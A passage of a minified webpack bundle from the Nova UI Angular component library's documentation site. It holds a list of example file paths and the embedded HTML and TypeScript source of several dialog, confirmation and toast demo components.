"textbox/textbox-docs/textbox-docs.example.component.html",\n    "textbox/textbox-docs/textbox-docs.example.component.ts",\n    "textbox/textbox-getting-value/textbox-getting-value.example.component.html",\n    "textbox/textbox-getting-value/textbox-getting-value.example.component.ts",\n    "textbox/textbox-hint/textbox-hint.example.component.html",\n    "textbox/textbox-hint/textbox-hint.example.component.ts",\n    "textbox/textbox-info/textbox-info.example.component.html",\n    "textbox/textbox-info/textbox-info.example.component.ts",\n    "textbox/textbox-number/index.ts",\n    "textbox/textbox-number/textbox-number-basic/textbox-number-basic.example.component.html",\n    "textbox/textbox-number/textbox-number-basic/textbox-number-basic.example.component.ts",\n    "textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.html",\n    "textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.less",\n    "textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.ts",\n    "textbox/textbox-number/textbox-number-min-max/textbox-number-min-max.example.component.html",\n    "textbox/textbox-number/textbox-number-min-max/textbox-number-min-max.example.component.ts",\n    "textbox/textbox-number/textbox-number-test/textbox-number-test.component.html",\n    "textbox/textbox-number/textbox-number-test/textbox-number-test.component.ts",\n    "textbox/textbox-number/textbox-number-visual-test/textbox-number-visual-test.component.html",\n    "textbox/textbox-number/textbox-number-visual-test/textbox-number-visual-test.component.ts",\n    "textbox/textbox-placeholder/textbox-placeholder.example.component.html",\n    "textbox/textbox-placeholder/textbox-placeholder.example.component.ts",\n    "textbox/textbox-readonly/textbox-readonly.example.component.html",\n    "textbox/textbox-readonly/textbox-readonly.example.component.ts",\n    "textbox/textbox-required/textbox-required.example.component.html",\n    "textbox/textbox-required/textbox-required.example.component.ts",\n    "textbox/textbox-visual-test/textbox-visual-test.component.html",\n    "textbox/textbox-visual-test/textbox-visual-test.component.ts",\n    "textbox/textbox.module.ts",\n    "theming/custom-theme/custom-theme.example.component.html",\n    "theming/custom-theme/custom-theme.example.component.less",\n    "theming/custom-theme/custom-theme.example.component.ts",\n    "theming/theme-switch-service/theme-switch-service.example.component.html",\n    "theming/theme-switch-service/theme-switch-service.example.component.ts",\n    "theming/theming-docs/theming-docs.example.component.html",\n    "theming/theming-docs/theming-docs.example.component.less",\n    "theming/theming-docs/theming-docs.example.component.ts",\n    "theming/theming.module.ts",\n    "time-frame-picker/index.ts",\n    "time-frame-picker/quick-picker-basic/quick-picker-basic.example.component.html",\n    "time-frame-picker/quick-picker-basic/quick-picker-basic.example.component.ts",\n    "time-frame-picker/time-frame-picker-basic/time-frame-picker-basic.example.component.html",\n    "time-frame-picker/time-frame-picker-basic/time-frame-picker-basic.example.component.ts",\n    "time-frame-picker/time-frame-picker-custom/time-frame-picker-custom.example.component.html",\n    "time-frame-picker/time-frame-picker-custom/time-frame-picker-custom.example.component.ts",\n    "time-frame-picker/time-frame-picker-date/time-frame-picker-date.example.component.html",\n    "time-frame-picker/time-frame-picker-date/time-frame-picker-date.example.component.ts",\n    "time-frame-picker/time-frame-picker-docs/time-frame-picker-docs.example.component.html",\n    "time-frame-picker/time-frame-picker-docs/time-frame-picker-docs.example.component.ts",\n    "time-frame-picker/time-frame-picker-inline/time-frame-picker-inline.example.component.html",\n    "time-frame-picker/time-frame-picker-inline/time-frame-picker-inline.example.component.ts",\n    "time-frame-picker/time-frame-picker-multiple-custom-pickers/time-frame-picker-multiple-custom-pickers.example.component.html",\n    "time-frame-picker/time-frame-picker-multiple-custom-pickers/time-frame-picker-multiple-custom-pickers.example.component.ts",\n    "time-frame-picker/time-frame-picker-test/time-frame-picker-test.example.component.html",\n    "time-frame-picker/time-frame-picker-test/time-frame-picker-test.example.component.ts",\n    "time-frame-picker/time-frame-picker-visual-test/time-frame-picker-visual-test.component.html",\n    "time-frame-picker/time-frame-picker-visual-test/time-frame-picker-visual-test.component.ts",\n    "time-frame-picker/time-frame-picker.module.ts",\n    "time-picker/index.ts",\n    "time-picker/time-picker-basic/time-picker-basic.example.component.html",\n    "time-picker/time-picker-basic/time-picker-basic.example.component.ts",\n    "time-picker/time-picker-custom-format/time-picker-custom-format.example.component.html",\n    "time-picker/time-picker-custom-format/time-picker-custom-format.example.component.ts",\n    "time-picker/time-picker-custom-step/time-picker-custom-step.example.component.html",\n    "time-picker/time-picker-custom-step/time-picker-custom-step.example.component.ts",\n    "time-picker/time-picker-disabled/time-picker-disabled.example.component.html",\n    "time-picker/time-picker-disabled/time-picker-disabled.example.component.ts",\n    "time-picker/time-picker-docs/time-picker-docs.example.component.html",\n    "time-picker/time-picker-docs/time-picker-docs.example.component.ts",\n    "time-picker/time-picker-localized/time-picker-localized.example.component.html",\n    "time-picker/time-picker-localized/time-picker-localized.example.component.ts",\n    "time-picker/time-picker-model-change/time-picker-model-change.example.component.html",\n    "time-picker/time-picker-model-change/time-picker-model-change.example.component.ts",\n    "time-picker/time-picker-preserve-isignificant/time-picker-preserve-insignificant.example.component.html",\n    "time-picker/time-picker-preserve-isignificant/time-picker-preserve-insignificant.example.component.ts",\n    "time-picker/time-picker-reactive-form/time-picker-reactive-form.example.component.html",\n    "time-picker/time-picker-reactive-form/time-picker-reactive-form.example.component.ts",\n    "time-picker/time-picker-visual-test/time-picker-visual-test.component.html",\n    "time-picker/time-picker-visual-test/time-picker-visual-test.component.ts",\n    "time-picker/time-picker.module.ts",\n    "toast/index.ts",\n    "toast/toast-basic/toast-basic.example.component.html",\n    "toast/toast-basic/toast-basic.example.component.ts",\n    "toast/toast-basic-html/toast-basic-html.example.component.html",\n    "toast/toast-basic-html/toast-basic-html.example.component.ts",\n    "toast/toast-config/toast-config.example.component.html",\n    "toast/toast-config/toast-config.example.component.ts",\n    "toast/toast-docs/toast-docs.example.component.html",\n    "toast/toast-docs/toast-docs.example.component.ts",\n    "toast/toast-events/toast-events.example.component.html",\n    "toast/toast-events/toast-events.example.component.ts",\n    "toast/toast-position/toast-position.example.component.html",\n    "toast/toast-position/toast-position.example.component.ts",\n    "toast/toast-sticky-error/toast-sticky-error.example.component.html",\n    "toast/toast-sticky-error/toast-sticky-error.example.component.ts",\n    "toast/toast-test/toast-test.component.html",\n    "toast/toast-test/toast-test.component.ts",\n    "toast/toast-type/toast-type.example.component.html",\n    "toast/toast-type/toast-type.example.component.ts",\n    "toast/toast-visual-test/toast-visual-test.component.html",\n    "toast/toast-visual-test/toast-visual-test.component.ts",\n    "toast/toast.module.ts",\n    "toolbar/index.ts",\n    "toolbar/toolbar-basic/toolbar-basic.example.component.html",\n    "toolbar/toolbar-basic/toolbar-basic.example.component.ts",\n    "toolbar/toolbar-docs/toolbar-docs.example.component.html",\n    "toolbar/toolbar-docs/toolbar-docs.example.component.ts",\n    "toolbar/toolbar-embedded-content/toolbar-embedded-content.example.component.html",\n    "toolbar/toolbar-embedded-content/toolbar-embedded-content.example.component.ts",\n    "toolbar/toolbar-item-types/toolbar-item-types.example.component.html",\n    "toolbar/toolbar-item-types/toolbar-item-types.example.component.ts",\n    "toolbar/toolbar-selection/toolbar-selection.example.component.html",\n    "toolbar/toolbar-selection/toolbar-selection.example.component.ts",\n    "toolbar/toolbar-test/toolbar-test.component.html",\n    "toolbar/toolbar-test/toolbar-test.component.ts",\n    "toolbar/toolbar-visual-test/toolbar-visual-test.component.html",\n    "toolbar/toolbar-visual-test/toolbar-visual-test.component.ts",\n    "toolbar/toolbar.module.ts",\n    "tooltip/index.ts",\n    "tooltip/tooltip-basic/tooltip-basic.example.component.html",\n    "tooltip/tooltip-basic/tooltip-basic.example.component.ts",\n    "tooltip/tooltip-disabled/tooltip-disabled.example.component.html",\n    "tooltip/tooltip-disabled/tooltip-disabled.example.component.ts",\n    "tooltip/tooltip-docs/tooltip-docs.example.component.html",\n    "tooltip/tooltip-docs/tooltip-docs.example.component.ts",\n    "tooltip/tooltip-ellipsis/tooltip-ellipsis.example.component.html",\n    "tooltip/tooltip-ellipsis/tooltip-ellipsis.example.component.ts",\n    "tooltip/tooltip-position/tooltip-position.example.component.html",\n    "tooltip/tooltip-position/tooltip-position.example.component.less",\n    "tooltip/tooltip-position/tooltip-position.example.component.ts",\n    "tooltip/tooltip-trigger/tooltip-trigger.example.component.html",\n    "tooltip/tooltip-trigger/tooltip-trigger.example.component.ts",\n    "tooltip/tooltip-visual-test/tooltip-visual-test.component.html",\n    "tooltip/tooltip-visual-test/tooltip-visual-test.component.ts",\n    "tooltip/tooltip.module.ts",\n    "wizard/index.ts",\n    "wizard/wizard-additional-button/wizard-additional-button.example.component.html",\n    "wizard/wizard-additional-button/wizard-additional-button.example.component.ts",\n    "wizard/wizard-busy/wizard-busy.example.component.html",\n    "wizard/wizard-busy/wizard-busy.example.component.ts",\n    "wizard/wizard-confirmation-dialog/wizard-confirmation-dialog.example.component.html",\n    "wizard/wizard-confirmation-dialog/wizard-confirmation-dialog.example.component.ts",\n    "wizard/wizard-constant-height/wizard-constant-height.example.component.html",\n    "wizard/wizard-constant-height/wizard-constant-height.example.component.ts",\n    "wizard/wizard-custom-step-line-width/wizard-custom-step-line-width.example.component.html",\n    "wizard/wizard-custom-step-line-width/wizard-custom-step-line-width.example.component.ts",\n    "wizard/wizard-dialog/wizard-dialog.example.component.html",\n    "wizard/wizard-dialog/wizard-dialog.example.component.ts",\n    "wizard/wizard-disabled/wizard-disabled.example.component.html",\n    "wizard/wizard-disabled/wizard-disabled.example.component.ts",\n    "wizard/wizard-docs/wizard-docs.example.component.html",\n    "wizard/wizard-docs/wizard-docs.example.component.ts",\n    "wizard/wizard-dynamic/wizard-dynamic.example.component.html",\n    "wizard/wizard-dynamic/wizard-dynamic.example.component.ts",\n    "wizard/wizard-dynamic-remove/wizard-dynamic-remove.example.component.html",\n    "wizard/wizard-dynamic-remove/wizard-dynamic-remove.example.component.ts",\n    "wizard/wizard-hide/wizard-hide.example.component.html",\n    "wizard/wizard-hide/wizard-hide.example.component.ts",\n    "wizard/wizard-reset-step/wizard-reset-step-example.component.ts",\n    "wizard/wizard-reset-step/wizard-reset-step.example.component.html",\n    "wizard/wizard-simple/wizard-simple.example.component.html",\n    "wizard/wizard-simple/wizard-simple.example.component.ts",\n    "wizard/wizard-steps/wizard-steps.example.component.html",\n    "wizard/wizard-steps/wizard-steps.example.component.ts",\n    "wizard/wizard-validation/wizard-validation.example.component.html",\n    "wizard/wizard-validation/wizard-validation.example.component.ts",\n    "wizard/wizard-visual-test/wizard-visual-test.component.html",\n    "wizard/wizard-visual-test/wizard-visual-test.component.ts",\n    "wizard/wizard-with-separate-step-headings/wizard-with-separate-step-headings.example.component.html",\n    "wizard/wizard-with-separate-step-headings/wizard-with-separate-step-headings.example.component.ts",\n    "wizard/wizard.module.ts",\n    "wizard-v2/index.ts",\n    "wizard-v2/wizard-async-validation-form/wizard-async-form-validation.example.component.html",\n    "wizard-v2/wizard-async-validation-form/wizard-async-form-validation.example.component.ts",\n    "wizard-v2/wizard-busy/wizard-busy.example.component.html",\n    "wizard-v2/wizard-busy/wizard-busy.example.component.less",\n    "wizard-v2/wizard-busy/wizard-busy.example.component.ts",\n    "wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.html",\n    "wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.less",\n    "wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.ts",\n    "wizard-v2/wizard-custom-layout/wizard-custom.component.html",\n    "wizard-v2/wizard-custom-layout/wizard-custom.component.less",\n    "wizard-v2/wizard-custom-layout/wizard-custom.example.component.html",\n    "wizard-v2/wizard-custom-layout/wizard-custom.example.component.ts",\n    "wizard-v2/wizard-dialog/wizard-dialog.example.component.html",\n    "wizard-v2/wizard-dialog/wizard-dialog.example.component.less",\n    "wizard-v2/wizard-dialog/wizard-dialog.example.component.ts",\n    "wizard-v2/wizard-docs/wizard-docs.component.html",\n    "wizard-v2/wizard-docs/wizard-docs.component.ts",\n    "wizard-v2/wizard-dynamic/wizard-dynamic.example.component.html",\n    "wizard-v2/wizard-dynamic/wizard-dynamic.example.component.ts",\n    "wizard-v2/wizard-horizontal/wizard-horizontal.example.component.html",\n    "wizard-v2/wizard-horizontal/wizard-horizontal.example.component.ts",\n    "wizard-v2/wizard-remove-step/wizard-remove-step.example.component.html",\n    "wizard-v2/wizard-remove-step/wizard-remove-step.example.component.ts",\n    "wizard-v2/wizard-responsive-header/wizard-responsive-header.example.component.html",\n    "wizard-v2/wizard-responsive-header/wizard-responsive-header.example.component.ts",\n    "wizard-v2/wizard-restore-state/wizard-restore-state.example.component.html",\n    "wizard-v2/wizard-restore-state/wizard-restore-state.example.component.less",\n    "wizard-v2/wizard-restore-state/wizard-restore-state.example.component.ts",\n    "wizard-v2/wizard-step-change/wizard-step-change.example.component.html",\n    "wizard-v2/wizard-step-change/wizard-step-change.example.component.ts",\n    "wizard-v2/wizard-test/wizard-test.component.html",\n    "wizard-v2/wizard-test/wizard-test.component.ts",\n    "wizard-v2/wizard-test/wizard-test.less",\n    "wizard-v2/wizard-tooltip/wizard-tooltip.example.component.html",\n    "wizard-v2/wizard-tooltip/wizard-tooltip.example.component.ts",\n    "wizard-v2/wizard-v2.module.ts",\n    "wizard-v2/wizard-vertical-layout/wizard-vertical.example.component.html",\n    "wizard-v2/wizard-vertical-layout/wizard-vertical.example.component.ts",\n    "wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.html",\n    "wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.less",\n    "wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.ts",\n    "wizard-v2/wizard-with-custom-icons/wizard-with-custom-icons.example.component.html",\n    "wizard-v2/wizard-with-custom-icons/wizard-with-custom-icons.example.component.ts",\n];\n'},93047:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" (click)="openWithComponent()" i18n>\n    Click me!\n</button>\n'},89199:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { DialogService } from "@nova-ui/bits";\n\nimport { DialogContentExampleComponent } from "./dialog-content.example.component";\n\n@Component({\n    selector: "nui-component-as-content-example",\n    templateUrl: "./component-as-content.example.component.html",\n})\nexport class ComponentAsContentExampleComponent {\n    constructor(@Inject(DialogService) private dialogService: DialogService) {}\n\n    public openWithComponent(): void {\n        const dialogRef = this.dialogService.open(\n            DialogContentExampleComponent,\n            { size: "sm" }\n        );\n        dialogRef.componentInstance.name = $localize`Dialog title`;\n    }\n}\n'},51461:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-dialog-header\n    [title]="name"\n    (closed)="activeDialog.close()"\n></nui-dialog-header>\n<div class="dialog-body">\n    <p i18n>\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam maximus\n        faucibus bibendum. Aenean feugiat interdum leo sed posuere. Etiam at\n        pulvinar enim, nec interdum purus. Duis elit metus, lobortis vitae quam\n        a, malesuada cursus quam. Duis vel lacinia purus. Maecenas eget arcu ac\n        ante sagittis eleifend vel ut purus. Pellentesque sit amet semper ipsum,\n        eu vulputate tortor. Aliquam vitae nisi augue. Duis non erat sit amet\n        sem venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n    </p>\n</div>\n<nui-dialog-footer>\n    <button\n        nui-button\n        type="button"\n        [isEmpty]="false"\n        (click)="onButtonClick(\'Cancel\')"\n        i18n\n    >\n        Cancel\n    </button>\n    <button\n        nui-button\n        type="button"\n        displayStyle="primary"\n        [isEmpty]="false"\n        (click)="onButtonClick(\'Action\')"\n        i18n\n    >\n        Action\n    </button>\n</nui-dialog-footer>\n'},17345:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, Input } from "@angular/core";\n\nimport { IToastService, NuiActiveDialog, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-content-example",\n    templateUrl: "./dialog-content.example.component.html",\n})\nexport class DialogContentExampleComponent {\n    @Input() name: string;\n\n    constructor(\n        @Inject(NuiActiveDialog) public activeDialog: any,\n        @Inject(ToastService) private toastService: IToastService\n    ) {}\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},52273:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    id="nui-demo-confirmation-dialog-btn-info"\n    nui-button\n    type="button"\n    (click)="openInfo()"\n    i18n\n>\n    Show Info Confirmation\n</button>\n<button\n    id="nui-demo-confirmation-dialog-btn-warning"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="openWarning()"\n    i18n\n>\n    Show Warning Confirmation\n</button>\n<button\n    id="nui-demo-confirmation-dialog-btn-critical"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="openCritical()"\n    i18n\n>\n    Show Critical Confirmation\n</button>\n'},85181:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { DialogService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-confirmation-dialog-example",\n    templateUrl: "./confirmation-dialog.example.component.html",\n})\nexport class ConfirmationDialogExampleComponent {\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public openInfo(): void {\n        this.dialogService\n            .confirm({\n                message: $localize`Are you sure you want to do it?`,\n                severity: "info",\n                setFocus: "confirm",\n            })\n            .result.then(\n                (result) => {\n                    this.toastService.info({\n                        message: result\n                            ? $localize`Confirmed`\n                            : $localize`Dismissed`,\n                    });\n                },\n                (reason) => {\n                    console.log("Rejected:", reason);\n                }\n            );\n    }\n    public openWarning(): void {\n        this.dialogService\n            .confirm({\n                message: $localize`Are you sure you want to do it?`,\n                severity: "warning",\n                setFocus: "dismiss",\n            })\n            .result.then(\n                (result) => {\n                    this.toastService.info({\n                        message: result\n                            ? $localize`Confirmed`\n                            : $localize`Dismissed`,\n                    });\n                },\n                (reason) => {\n                    console.log("Rejected:", reason);\n                }\n            );\n    }\n    public openCritical(): void {\n        this.dialogService\n            .confirm({\n                message: $localize`Are you sure you want to do it?`,\n                severity: "critical",\n                setFocus: "dismiss",\n            })\n            .result.then(\n                (result) => {\n                    this.toastService.info({\n                        message: result\n                            ? $localize`Confirmed`\n                            : $localize`Dismissed`,\n                    });\n                },\n                (reason) => {\n                    console.log("Rejected:", reason);\n                }\n            );\n    }\n}\n'},32453:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="closeFromHeader()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="actionCanceled()" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="actionDone()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-default-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content)"\n    i18n\n>\n    Click me!\n</button>\n'},24321:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, TemplateRef } from "@angular/core";\nimport { take, takeUntil } from "rxjs/operators";\n\nimport { DialogService, NuiDialogEvent, NuiDialogRef } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-actions-before-closure-example",\n    templateUrl: "./dialog-actions-before-closure.example.component.html",\n})\nexport class DialogActionBeforeClosureExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(private dialogService: DialogService) {}\n\n    public open(content: TemplateRef<string>): void {\n        // You can return \'false\' from the optional beforeDismiss function anytime you want to prevent the dialog from closing.\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            beforeDismiss: this.beforeDismiss,\n        });\n\n        // You can use the beforeDismissed$ event to execute actions right before the dialog gets closed\n        this.activeDialog.beforeDismissed$\n            .pipe(\n                // Be sure to unsubscribe on dialog closure\n                takeUntil(this.activeDialog.closed$)\n            )\n            .subscribe((event) => {\n                // A dialog will typically close in response to the escape key\n                if (event === NuiDialogEvent.EscapeKey) {\n                    console.log($localize`ESC CLOSED`);\n                }\n                // Covering the \'BACKDROP_CLICK\' event in case of clearing the dialog by clicking the backdrop\n                if (event === NuiDialogEvent.BackdropClick) {\n                    console.log($localize`BACKDROP CLICK CLOSED`);\n                    return;\n                }\n                // Here we cover the custom \'DONE\' event which you can create and then capture within the \'beforeDismissed$\' subscription\n                // to run your custom logic in response to that event right before the dialog closure.  See \'actionDone\' implementation below.\n                if (event === "DONE") {\n                    console.log($localize`DONE`);\n                    return;\n                }\n                // Set of actions for all event origins before the dialog closes\n                console.log($localize`BEFORE CLOSED`);\n                // Manually close the dialog since the `beforeDismiss` implementation below short-circuits dismissal with its \'false\' return value\n                this.activeDialog.close();\n            });\n\n        // You can perform any required actions just after dialog closure here\n        this.activeDialog.closed$.pipe(take(1)).subscribe(() => {\n            console.log($localize`CLOSED`);\n        });\n    }\n\n    public actionDone(): void {\n        console.log($localize`ACTION DONE`);\n        this.activeDialog.dismiss("DONE");\n    }\n\n    public actionCanceled(): void {\n        console.log($localize`ACTION CANCELED`);\n        this.activeDialog.dismiss();\n    }\n\n    public beforeDismiss(): boolean {\n        return false;\n    }\n\n    public closeFromHeader(): void {\n        console.log($localize`CLOSE BUTTON CLICKED`);\n        this.activeDialog.dismiss();\n    }\n}\n'},49089:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" (click)="openConfirmationDialog()" i18n>\n    Confirmation\n</button>\n<button\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="openWithComponent()"\n    i18n\n>\n    Custom Component\n</button>\n'},40653:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnDestroy, OnInit } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\nimport { DialogContentExampleComponent } from "../component-as-content/dialog-content.example.component";\n\n@Component({\n    selector: "nui-dialog-after-opened-example",\n    templateUrl: "./dialog-after-opened.example.component.html",\n})\nexport class DialogAfterOpenedExampleComponent implements OnInit, OnDestroy {\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public destroy$$: Subject<void> = new Subject<void>();\n\n    public ngOnInit(): void {\n        this.dialogService.afterOpened$\n            .pipe(takeUntil(this.destroy$$))\n            .subscribe((dialog: NuiDialogRef) => {\n                if (dialog.componentInstance) {\n                    this.toastService.info({\n                        message: `${dialog.componentInstance.constructor.name} was opened`,\n                    });\n                }\n            });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$$.next();\n        this.destroy$$.complete();\n    }\n\n    public openConfirmationDialog(): void {\n        this.dialogService.confirm({\n            message: $localize`Are you sure you want to do it?`,\n            severity: "info",\n            setFocus: "confirm",\n            title: "Confirmation dialog",\n        });\n    }\n\n    public 